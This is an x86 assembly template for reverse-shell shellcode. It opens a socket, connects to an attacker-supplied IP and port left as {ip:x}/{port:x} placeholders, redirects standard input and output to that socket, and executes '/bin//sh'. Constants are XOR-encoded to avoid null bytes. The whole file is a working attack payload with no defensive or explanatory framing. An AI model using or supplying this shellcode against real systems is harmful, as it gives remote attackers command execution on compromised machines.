/* SYS Socket */
xor    eax,eax
push   eax   /* 0 */
inc    eax
push   eax   /* 1 */
inc    eax
push   eax   /* 2 */
mov    al,0x61
push   eax
int    0x80

/* Create sockaddr_in */
mov    edx, 0xBBBBBBBB
xor    edx, 0x{ip:x}
push   edx

mov    edx, 0xBBBBBBBB
xor    edx, 0x{port:x}
push   edx

mov    edx,eax
mov    eax, esp

/* SYS Connect(edx, eax, 0x10) */
xor     ecx, ecx
mov     cl, 0x10
push    ecx
push    eax
push    edx
xor     eax, eax
mov     al, 0x62
push    eax
int     0x80

/* SYS Dup2 */
xor    ecx,ecx
push   ecx
push   edx
xor    eax,eax
mov    al,0x5a
push   eax
int    0x80

/* SYS Dup2 */
xor    ecx,ecx
inc    ecx
push   ecx
push   edx
xor    eax,eax
mov    al,0x5a
push   eax
int    0x80

/*  Clear eax, ecx, edx */
xor eax, eax
push eax

/* Push '/bin//sh\x00' */
mov ecx, 0xAAAAAAAA
xor ecx, 0xc2d98585
push ecx
mov ecx, 0xAAAAAAAA
xor ecx, 0xc4c3c885
push ecx
mov ecx, esp

/*  execve("/bin//sh", [junk, 0], [0]); */
push eax
push esp
push esp
push ecx
push eax
mov al, 59
int 0x80